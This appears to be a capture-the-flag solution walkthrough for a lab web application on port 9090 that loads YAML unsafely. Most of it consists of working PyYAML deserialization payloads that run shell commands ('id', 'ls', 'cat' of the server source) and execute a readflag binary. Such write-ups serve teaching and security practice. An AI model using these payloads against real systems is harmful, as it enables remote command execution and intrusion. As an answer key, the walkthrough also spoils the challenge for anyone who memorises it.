# How to solve the challenge

1. **Access the application**

   ```
   https://<IP Address of the system>:9090
   ```

2. **Enter the payload**

   ```yaml
   !!python/object/apply:os.system
   - id
   ```

   Observe the application is susceptible to command injection via the unsafe deserialization method.

3. **Enter the payload to list the files in the directory**

   ```yaml
   !!python/object/new:str
   - !!python/object/apply:subprocess.check_output
     - ls
   ```

   Observe the file *deser_server.py*.
   
4. **Try to read the contents of the file**

	```yaml
	!!python/object/new:str
	- !!python/object/apply:subprocess.check_output
	  - !!python/tuple
	    - cat
	    - deser_server.py
	```
	
	Observe the code to find how to read the flag. </br>

5. **Call the function to read the flag**

	```yaml
	!!python/object/new:str
	- !!python/object/apply:subprocess.check_output
	  - !!python/tuple
	    - /usr/local/bin/readflag
	```

**Got the flag**
